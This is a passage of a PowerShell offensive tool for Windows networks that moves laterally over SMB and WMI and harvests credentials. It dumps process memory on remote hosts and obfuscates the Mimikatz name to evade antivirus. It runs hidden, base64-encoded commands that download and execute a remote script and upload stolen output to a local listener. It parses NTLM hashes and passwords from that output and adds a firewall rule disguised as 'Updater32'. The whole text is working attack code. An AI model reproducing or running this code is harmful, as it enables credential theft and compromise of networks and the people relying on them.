            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}


            #Execute and pull via SMB on all $Hosts
            $Hosts | % {
            if($GoldenTicket){
                $1 = "net use P: \\$_\C$"
                $2 = "wmic /node:$_ /authority:'kerberos:$Domain\$_' process call create `"cmd.exe /c $ExecPSString`""

            }
            elseif(!$GoldenTicket){
                $1 = "net use P: \\$_\C$ /user:$UserStr $Password"
                $2 = "wmic /node:$_ /user:$UserStr /password:$Password process call create `"cmd.exe /c $ExecPSString`""
            }

            $3 = "copy '$DumpDir`crash.dmp' '$OutputFolder\$_-$Process.dmp'"
            $4 = "del '$DumpDir`crash.dmp'"
            $5 = "net use P: /delete"

            IEX $1 | Out-Null
            Write-Host "[+] Mounted \\$_\C$ Share"
            Write-Host "[*] Running wmic to perform a minidump on the $Process process of $_"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $2 | Out-Null
            Write-Host "[*] Waiting for the memory dump to complete..."
            Do{
            sleep 0.5
            } until (Test-Path "$DumpDir`crash.dmp")
            Write-Host "[+] Memory successfully dumped at $DumpDir`crash.dmp"
            Write-Host "[*] Copying credential dump to $OutputFolder"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $3 | Out-Null
            Write-Host "[+] Credential dump copied to $OutputFolder"
            Write-Host "[*] Performing cleanup on $_..."
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $4 | Out-Null
            Write-Host "[+] Cleanup complete"
            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            IEX $5 | Out-Null
            Write-Host "{+] Unmounted \\$_\C$ Share"
            Write-Host "[+] Dumping of the $Process process complete for $_"
            }
            break
        }
        elseif($MassKatz){
            #bypass virus scan for m i m i k a t z strings
            $all = "Invoke-"
            $all += "Mim"
            $all += "ika"
            $all += "tz"
            $all = $all -join ''

            if(!$CustomCommand){
                $CustomCommand = $all
            }

            if(!$ScriptDir){
            Write-Warning "[!] Please use the -ScriptDir flag to specify the full URL file path where $all.ps1 is stored on a web server!"
            "[!] Please use the -ScriptDir flag to specify the full URL file path where $all.ps1 is stored on a web server!"
            return
            }

            #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "Mkatz_Output"
            }

            # if the output folder isn't a full path, append to user's desktop
            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}

                # script block to invoke over remote machines.
                $LocalPort = $ServerPort
                if($FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder -FirewallRule}
                elseif(!$FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder }

                if(-not $LocalIpAddress){
                    $p = (gwmi Win32_NetworkAdapterConfiguration| Where{$_.IPAddress} | Select -Expand IPAddress);
                    # check if the IP is a string or the [IPv4,IPv6] array
                    $LocalIpAddress = $p[0]
                }


                $hosts | % {
                    # the download/check back in command
                    $ExecCommand = "IEX (New-Object Net.Webclient).DownloadString('$ScriptDir'); $CustomCommand | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString(`"http://$LocalIpAddress`:$LocalPort/$_`", `$_)}"
                    $bytes = [Text.Encoding]::Unicode.GetBytes($ExecCommand)
                    $ExecEncoded = [Convert]::ToBase64String($bytes)

                    #Compile full execution string
                    $ExecPSString = "powershell.exe -nOP -noNi -W Hidden -E $ExecEncoded"

                    # see if different credentials are specified to run on the remote host
                    if($Password){
                        $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
                        $creds = New-Object System.Management.Automation.PSCredential ($UserStr, $secpass)
                        Write-Host "[*] Executing command on host $_ with credentials for $UserStr"
                        Invoke-WmiMethod -Credential $creds -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                    else{
                        Write-Host "Executing command on host $_ as $env:USERDOMAIN\$env:USERNAME"
                        Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                }



                if(!$ServerSleep){
                $ServerSleep=30
                }
                Write-Host "[*] Waiting $ServerSleep seconds for commands to trigger..."
                Start-Sleep -s $ServerSleep

                # parse all of the output
                Write-Host "[*] Parsing output from folder `"$OutputFolder`""
		        $CurrentLoc = $PWD
		        Set-Location $OutputFolder
                [string[]]$parseout = ""
                Get-ChildItem $OutputFolder -Filter *.txt |
                foreach-object {
                    [string[]]$serverstring = $_.Name[0 .. ($_.Name.Length - 5)] -join ''
                    $raw = [Io.File]::ReadAllText($_.FullName)
                    $creds = Parse-Mkatz $raw

                    foreach($cred in $creds){
                        if ( ($cred) -and ($cred.Trim() -ne "")){
                            $parseout += "$serverstring`t`t$cred"

                        }
                    }
                }
                Write-Host "`nHost`t`t`tCredentials"
                Write-Host "----`t`t`t-----------"
                $parseout
                Write-Host "`n"
		        Set-Location $CurrentLoc

            if($FirewallRule){
            Stop-Server -FirewallRule}
            elseif(!$FirewallRule)
            {Stop-Server}



            break
        }
        elseif($ExecPS){

            if(!$CustomCommand){
                Write-Warning "[!] Please use the -CustomCommand flag to specify the command you would like to run from the script!"
                "[!] Please use the -CustomCommand flag to specify the command you would like to run from the script!"
                break
            }

            if(!$ScriptDir){
                Write-Warning "[!] Please use the -ScriptDir flag to specify the full URL file path where the PowerShell script is stored on a web server!"
                "[!] Please use the -ScriptDir flag to specify the full URL file path where the PowerShell script is stored on a web server!"
                break
            }

            #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "PSCommand_Output"
            }

            # if the output folder isn't a full path, append to user's desktop
            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}

                # script block to invoke over remote machines.
                $LocalPort = $ServerPort
                if($FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder -FirewallRule}
                elseif(!$FirewallRule){
                Start-Server -ServerPort $LocalPort -OutputFolder $OutputFolder }

                if(-not $LocalIpAddress){
                    $p = (gwmi Win32_NetworkAdapterConfiguration| Where{$_.IPAddress} | Select -Expand IPAddress);
                    # check if the IP is a string or the [IPv4,IPv6] array
                    $LocalIpAddress = $p[0]
                }


                $hosts | % {
                    # the download/check back in command
                    $ExecCommand = "IEX (New-Object Net.Webclient).DownloadString('$ScriptDir'); $CustomCommand | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString(`"http://$LocalIpAddress`:$LocalPort/$_`", `$_)}"
                    $bytes = [Text.Encoding]::Unicode.GetBytes($ExecCommand)
                    $ExecEncoded = [Convert]::ToBase64String($bytes)

                    #Compile full execution string
                    $ExecPSString = "powershell.exe -nOP -noNi -W Hidden -E $ExecEncoded"

                    # see if different credentials are specified to run on the remote host
                    if($Password){
                        $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
                        $creds = New-Object System.Management.Automation.PSCredential ($UserStr, $secpass)
                        Write-Host "[*] Executing command on host $_ with credentials for $UserStr"
                        Invoke-WmiMethod -Credential $creds -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                    else{
                        Write-Host "Executing command on host $_ as $env:USERDOMAIN\$env:USERNAME"
                        Invoke-WmiMethod -ComputerName $_ -Path Win32_process -Name create -ArgumentList "$ExecPSString" | out-null
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                }


                if(!$ServerSleep){
                $ServerSleep=10
                }
                Write-Host "[*] Waiting $ServerSleep seconds for commands to trigger..."
                Start-Sleep -s $ServerSleep

		        #Parse all output
                Write-Host "[*] Parsing output from folder `"$OutputFolder`""
                $CurrentLoc = $PWD
                Set-Location $OutputFolder
                Get-ChildItem $OutputFolder -Filter *.txt |
                % {$a = $_.Name -split ".tx",0;Write-Host $a[0] "results:" ;Write-Host "-------------";Get-Content $_;Write-Host "-------------"}
                Set-Location $CurrentLoc

            if($FirewallRule){
            Stop-Server -FirewallRule}
            elseif(!$FirewallRule)
            {Stop-Server}



            break
        }
        else{
            Write-Warning "[!] Please use the -Command, -ProcDump, -MiniDump, -MassKatz, -InvMkatz or -ExecPS switch!"
            "[!] Please use the -Command, -ProcDump, -MiniDump. -MassKatz, -InvMkatz or -ExecPS switch!"
            break
        }

    }

}


function Parse-Mkatz { #taken from Invoke-MassMimikatz.ps1 by @harmjoy

    [CmdletBinding()]
    param(
        [string]$raw
    )

    # msv
	$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        foreach($match in $results){
            if($match.Contains("Domain")){
                $lines = $match.split("`n")
                foreach($line in $lines){
                    if ($line.Contains("Username")){
                        $username = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Domain")){
                        $domain = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("NTLM")){
                        $password = $line.split(":")[1].trim()
                    }

                }
                if ($password -and $($password -ne "(null)")){
                    $username+"/"+$domain+":"+$password
                }
            }
        }
    }
    $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        foreach($match in $results){
            if($match.Contains("Domain")){
                $lines = $match.split("`n")
                foreach($line in $lines){
                    if ($line.Contains("Username")){
                        $username = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Domain")){
                        $domain = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Password")){
                        $password = $line.split(":")[1].trim()
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $username+"/"+$domain+":"+$password
                }
            }
        }
    }
    $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        foreach($match in $results){
            if($match.Contains("Domain")){
                $lines = $match.split("`n")
                foreach($line in $lines){
                    if ($line.Contains("Username")){
                        $username = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Domain")){
                        $domain = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Password")){
                        $password = $line.split(":")[1].trim()
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $username+"/"+$domain+":"+$password
                }
            }
        }
    }
    $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        foreach($match in $results){
            if($match.Contains("Domain")){
                $lines = $match.split("`n")
                foreach($line in $lines){
                    if ($line.Contains("Username")){
                        $username = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Domain")){
                        $domain = $line.split(":")[1].trim()
                    }
                    elseif ($line.Contains("Password")){
                        $password = $line.split(":")[1].trim()
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $username+"/"+$domain+":"+$password
                }
            }
        }
    }
}

function Start-Server{
<#
.DESCRIPTION
Based on @obsuresec's dirty web server and @harmjoy's Invoke-MassMimikatz web server portion of code. This function creates a PowerShell web server on the host machine as a job. REQUIRES LOCAL ADMINISTRATOR.

.PARAMETER ServerPort
Specifies what port the web server will run on.

.PARAMETER FirewallRule
Specifies that a firewall exception will be made for inbound traffic to $ServerPort

.PARAMETER OutputFolder
Used by the -Mkatz and -Command w/ -Server functions of Invoke-LateralMovement, all data posted to the server will go into a this folder.

.PARAMETER Standalone
Allows the web server to host files without being run through the Mkatz or Command functions.

.PARAMETER HostFolder
Specifies the folder that will be hosted on the web server.

.EXAMPLE Create a webserver on the local machine running on port 8080. All files in the C:\temp folder will be hosted. A Firewall exception will be made for inbound traffic on Port 8080.
Start-Server -ServerPort "8080" -HostFolder "C:\temp" -Standalone -FirewallRule

#>
[CmdletBinding()]
Param(
        [switch]
        $FirewallRule,

        [string]
        $ServerPort="80",

        [string]
        $OutputFolder,

        [switch]
        $Standalone,

        [string]
        $HostFolder = "$env:USERPROFILE\Desktop"

)
           $LocalPort = $ServerPort


            if($Standalone){
            $WebserverScriptblock={
            param($LocalPort,$HostFolder)
            $Hso = New-Object Net.HttpListener
            $Hso.Prefixes.Add("http://+:$LocalPort/")
            $Hso.Start()
            While ($Hso.IsListening) {
                $HC = $Hso.GetContext()
                $HRes = $HC.Response
                $HRes.Headers.Add("Content-Type","text/plain")
                if( $HC.Request.RawUrl){
                $Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $HostFolder ($HC.Request).RawUrl)))
                }
                $HRes.ContentLength64 = $Buf.Length
                $HRes.OutputStream.Write($Buf,0,$Buf.Length)
                $HRes.Close()
            }
            $Hso.Stop()
            }
            }
            elseif(!$Standalone){
            #Check to see if Output folder was set, if not create new folder
            if(!$OutputFolder){
                $OutputFolder = "Output"
            }

            # if the output folder isn't a full path, append to user's desktop
            if(-not ($OutputFolder.Contains("\"))){
                    $OutputFolder = "$env:USERPROFILE\Desktop\$OutputFolder"
            }

            # create the output folder if it doesn't exist
            if(-not (Test-Path $OutputFolder)){
            New-Item -Force -ItemType directory -Path $OutputFolder | Out-Null}
            $WebserverScriptblock={
            param($LocalPort, $OutputFolder)

                $Hso = New-Object Net.HttpListener
                $Hso.Prefixes.Add("http://+:$LocalPort/")
                $Hso.Start()

                while ($Hso.IsListening) {
                    $HC = $Hso.GetContext()
                    $OriginatingIP = $HC.Request.UserHostAddress
                    $HRes = $HC.Response
                    $HRes.Headers.Add("Content-Type","text/plain")
                    $Buf = [Text.Encoding]::UTF8.GetBytes("")
                    $test = "Testing 1 2 3 :D"
                    # process any GET requests
                    if( $HC.Request.RawUrl -eq "/update"){
                        $Buf = [Text.Encoding]::UTF8.GetBytes("$test")
                    }
                    elseif( $HC.Request.RawUrl -eq "/test"){
                        $Buf = [Text.Encoding]::UTF8.GetBytes("$test")
                    }
                    # process any POST results from the invoked script
                    else {
                        # extract the hostname from the URI request
                        $hostname = $HC.Request.RawUrl.split("/")[-1]

                        $output = ""
                        $size = $HC.Request.ContentLength64 + 1

                        $buffer = New-Object byte[] $size
                        do {
                            $count = $HC.Request.InputStream.Read($buffer, 0, $size)
                            $output += $HC.Request.ContentEncoding.GetString($buffer, 0, $count)
                        } until($count -lt $size)
                        $HC.Request.InputStream.Close()

                        if (($output) -and ($output.Length -ne 0)){
                            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))

                            $OutFile = $OutputFolder + "\$($hostname).txt"


                            $decoded | Out-File -Append -Encoding ASCII -FilePath $OutFile
                        }
                    }
                    $HRes.ContentLength64 = $Buf.Length
                    $HRes.OutputStream.Write($Buf,0,$Buf.Length)
                    $HRes.Close()
                }
        }
        }

        # add a temporary firewall rule if specified
        if($FireWallRule){
            Write-Host "[*] Setting inbound firewall rule for port $LocalPort"
            $fw = New-Object -ComObject hnetcfg.fwpolicy2
            $rule = New-Object -ComObject HNetCfg.FWRule
            $rule.Name = "Updater32"
            $rule.Protocol = 6
            $rule.LocalPorts = $LocalPort
            $rule.Direction = 1
            $rule.Enabled=$true
            $rule.Grouping="@firewallapi.dll,-23255"
            $rule.Profiles = 7
            $rule.Action=1
            $rule.EdgeTraversal=$false
            $fw.Rules.Add($rule)
        }
        #
        if($Standalone){
        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $LocalPort,$HostFolder | Out-Null
        }
        if(!$Standalone){
        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $LocalPort,$OutputFolder | Out-Null}
        Write-Host "[*] Sleeping, letting the web server stand up..."
        Start-Sleep -s 5
        Write-Host "[+] Web server started"
}

function Stop-Server{
<#
.DESCRIPTION
Based on @obsuresec's dirty web server and @harmjoy's Invoke-MassMimikatz web server portion of code. This function creates a PowerShell web server on the host machine as a job. REQUIRES LOCAL ADMINISTRATOR.

.PARAMETER FirewallRule
Specifies that the firewall exception made in the Start-Server function will be removed

.SWITCH Force
Force kills the server, might destroy other listening processes by accident...

.PARAMETER Port
Used with -Force to specify the process the port is listening on to kill
#>
#TODO figure out a better way to kill the web server because it hangs...
[CmdletBinding()]
Param(
        [switch]
        $FirewallRule,

        [switch]
        $Force,

        [string]
        $Port

)
        # remove the firewall rule if specified
        if($FireWallRule){
            $fw = New-Object -ComObject hnetcfg.fwpolicy2
            Write-Host "[*] Removing inbound firewall rule"
            $fw.rules.Remove("Updater32")
        }

        Write-Host "[*] Killing the web server"
        if($Force){
        $portstring = ":$Port"
        netstat -a -o -n  | select -skip 4  | % {$a = $_ -split ' {3,}'; New-Object 'PSObject' -Property @{Original=$_;Fields=$a}}  | ? {$_.Fields[1] -match $portstring} | % {taskkill /F /PID $_.Fields[4] } |Out-Null
        Write-Host "[+] Web server killed"
        break
        }


        Get-Job -Name WebServer | Stop-Job
        Write-Host "[+] Web server killed"
        break
}
